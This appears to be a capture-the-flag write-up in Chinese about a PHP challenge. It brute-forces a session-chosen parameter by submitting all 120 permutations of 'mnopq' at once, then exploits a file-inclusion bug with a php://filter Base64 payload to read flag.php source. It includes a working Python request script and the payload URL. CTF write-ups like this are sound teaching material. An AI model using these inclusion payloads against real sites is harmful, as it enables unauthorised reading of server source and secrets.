# 11 第十一章 千机变·破妄之眼

## 题目简述

服务在 session 中保存 `str_shuffle('mnopq')` 生成的五字符参数名，只有请求同时满足“参数存在且参数值等于参数名”才跳转到 `find.php`。这不是无限参数空间，而是 `mnopq` 的 $5! = 120$ 个排列。`find.php` 随后把 `file` 参数直接交给 `include`，并显式允许 `php://`，可用 Base64 过滤器读取 `flag.php` 源码中的注释。

## 解题过程

第一阶段源码为：

```php
if (!isset($_SESSION['param'])) {
    $_SESSION['param'] = str_shuffle('mnopq');
}

$param = $_SESSION['param'];
if (isset($_GET[$param]) && $_GET[$param] == $param) {
    header('Location: find.php');
}
```

源码还有每 session 一秒一次的限速。无需发 120 个请求：把所有排列同时作为查询参数提交，并令每个值等于自身，其中必然包含当前 session 选择的参数。

```python
from itertools import permutations

import requests

BASE_URL = "http://challenge"
params = {
    "".join(chars): "".join(chars)
    for chars in permutations("mnopq")
}

session = requests.Session()
response = session.get(BASE_URL, params=params, allow_redirects=False, timeout=10)
print(response.status_code, response.headers.get("Location"))
```

成功响应为 `302`，`Location` 指向 `find.php`。第二阶段关键代码是：

```php
$target = $_GET['file'] ?? './';
if (basename($target) != 'find.php' && basename($target) != 'index.php') {
    include $target;
}
```

目录浏览可以发现 `flag.php`。直接 include 会执行 PHP，注释中的 flag 不会显示；改用过滤器先把源码转为 Base64：

```text
/find.php?file=php://filter/convert.base64-encode/resource=flag.php
```

复制页面输出并 Base64 解码，即可看到 `flag.php` 的完整源代码和注释内 flag。

## 方法总结

- 核心技巧：把有限参数候选一次性全部提交绕过 session 限速，再用 `php://filter` 读取被 `include` 执行隐藏的源码。
- 识别信号：随机值来自固定字符排列时，应先计算有限状态空间；PHP 文件包含敏感注释但直接访问只执行不显示时，应想到 Base64 filter。
- 复用要点：爆破 session 状态必须保持 Cookie；如果条件只检查某个键是否存在，可考虑“候选集合一次提交”，避免逐请求枚举。
